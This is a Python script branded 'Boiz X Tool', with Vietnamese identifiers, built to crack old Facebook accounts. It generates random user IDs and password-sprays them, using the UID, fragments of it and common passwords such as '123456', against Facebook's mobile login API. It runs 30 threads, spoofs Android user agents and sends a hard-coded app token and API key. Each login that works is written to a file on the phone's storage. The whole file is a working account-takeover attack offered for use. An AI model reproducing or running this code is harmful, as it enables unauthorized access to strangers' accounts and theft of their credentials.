import os
import time
import sys
import datetime
import requests
from rich.console import Console
from time import localtime as lt
import bs4
import json
import random
import re
import subprocess
import platform
import struct
import string
import uuid
import base64
import zlib
from concurrent.futures import ThreadPoolExecutor

def rainbow_text(text):
    colors = [
       "[95m",  # tím
        
          
        
       
        
        
        
        
    ]
    reset = "[0m"
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    result += reset
    return result
vong_lap = 0
hien_thi_so_acc_carack_duoc = 0
hien_thi_so_giay_dang_chay = 0-999999
hien_thi_thoi_gian_chay = 999999
hien_thi_thoi_gian_dem = 1-999999
thoi_gian = 1
dem = 1
thanh_cong = []
loi_xac_thuc = []
hai_y = []
dai_ly_nguoi_dung = []
danh_sach_dai_ly = []
okhbros = []
uas = []

def boiz_xoa_man_hinh():
    os.system('clear')
    boiz_logo()


def boiz_logo():
    os.system('clear')
    banner = """
██████╗░░█████╗░██╗███████╗
██╔══██╗██╔══██╗██║╚════██║
██████╦╝██║░░██║██║░░███╔═╝
██╔══██╗██║░░██║██║██╔══╝░░
██████╦╝╚█████╔╝██║███████╗
╚═════╝░░╚════╝░╚═╝╚══════╝
"""
    print(rainbow_text(banner))
    print(rainbow_text("Boiz X Tool"))
    print(rainbow_text("Nhà phát triển: Boizxtool & Nguyễn Đức Anh"))
    print(rainbow_text("Tool: Đào via cổ"))
    print(rainbow_text("Tool:bản quyền boiz v2"))


def boiz_tao_dai_ly_nguoi_dung():
    try:
        for _ in range(100):
            a = 'Mozilla/5.0 (Linux; Android '
            b = random.choice(['5.0', '6.0', '7.0', '8.1.0', '9', '10', '11', '12'])
            c = random.choice(['M2101K6G', 'SM-J320H', 'RMX3571', 'TECNO CE8'])
            d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
            e = random.randrange(1, 999)
            f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(80, 103)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uakuh = f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
            danh_sach_dai_ly.append(uakuh)
    except:
        pass

try:
    os.system('clear')
    print('Hệ thống đã cài đặt')
    time.sleep(1.5)
    os.system('pkg install libjpeg-turbo;pkg install zlib;pkg install libpng;pkg install espeak')
    sys.stdout.write('Boiz X Tool')
except:
    pass

boiz_tao_dai_ly_nguoi_dung()

def boiz_chinh():
    boiz_xoa_man_hinh()
    print('1 Via/Clone Cổ 2009|2010')
    print('2 Via/Clone Cổ 2011|2012')
    print('3 Via/Clone Cổ 2013|2014')
    ch = Console().input('Nhập lựa chọn: ')
    if ch in ['1', '01']:
        boiz_old1()
    elif ch in ['2', '02']:
        boiz_old2()
    elif ch in ['3', '03']:
        boiz_old3()
    else:
        boiz_chinh()

def boiz_thu_dang_nhap(uid, danh_sach_mat_khau, duong_dan_tep, nam_sinh):
    global vong_lap, thanh_cong, loi_xac_thuc
    try:
        for mat_khau in danh_sach_mat_khau:
            phien = requests.Session()
            sys.stdout.write(f'{vong_lap} {len(thanh_cong)} {len(loi_xac_thuc)}')
            sys.stdout.flush()
            ua = random.choice(danh_sach_dai_ly)
            du_lieu = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(mat_khau),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'locale': 'en_VIET NAM',
                'client_country_code': 'US',
                'client_country_code': 'VIET NAM',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            tieu_de = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-graph.facebook.com/auth/login'
            phan_hoi = phien.post(url, data=du_lieu, headers=tieu_de, allow_redirects=False, verify=True).json()
            if 'session_key' in phan_hoi or 'www.facebook.com' in phan_hoi.get('error', {}).get('message', ''):
                print(f'Tài khoản: {uid}')
                print(f'Mật khẩu: {mat_khau}')
                print(f'Năm sinh: {nam_sinh}')
                with open(duong_dan_tep, 'a') as f:
                    f.write(f'{uid} | {mat_khau} | {nam_sinh}\n')
                thanh_cong.append(uid)
                break
            elif 'Please confirm your identity' in phan_hoi.get('error', {}).get('message', ''):
                loi_xac_thuc.append(uid)
                break
    except Exception as e:
        time.sleep(1)
    vong_lap += 1

def boiz_bat_dau_crack(tien_to_nam, duoi_tep, nam_sinh):
    danh_sach_nguoi_dung = []
    boiz_logo()
    print('Ví dụ: 10000|20000|30000|40000 đến 99999')
    gioi_han = Console().input('Nhập số lượng: ')
    for i in range(int(gioi_han)):
        du_lieu = str(random.choice(range(1000000000, 1999999999)))
        danh_sach_nguoi_dung.append(du_lieu)
    with ThreadPoolExecutor(max_workers=30) as boiz:
        boiz_logo()
        print(f'Tổng số ID: {gioi_han}')
        print('Boiz đang scan acc cho ae nhanh nhất có thể nhé')
        danh_sach_mat_khau = ['123456', '1234567', '12345678', '123456789', '111222']
        for mal in danh_sach_nguoi_dung:
            uid = tien_to_nam + mal
            duong_dan_tep = f'/sdcard/BoizXTool-J{duoi_tep}-by tool.txt'
            boiz.submit(boiz_thu_dang_nhap, uid, [uid, mal[:6], mal[:7], mal[:8]] + danh_sach_mat_khau, duong_dan_tep, nam_sinh)
    print('Crack hoàn tất')
    print(f'Tổng số tài khoản thành công: {len(thanh_cong)}')
    Console().input('Nhấn enter để tiếp tục: ')
    boiz_chinh()

def boiz_old1():
    boiz_bat_dau_crack('100000', '1', '2009-2010')

def boiz_old2():
    boiz_bat_dau_crack('10000', '2', '2011-2012')

def boiz_old3():
    boiz_bat_dau_crack('10000', '3', '2013-2014')

if __name__ == '__main__':
    boiz_chinh()
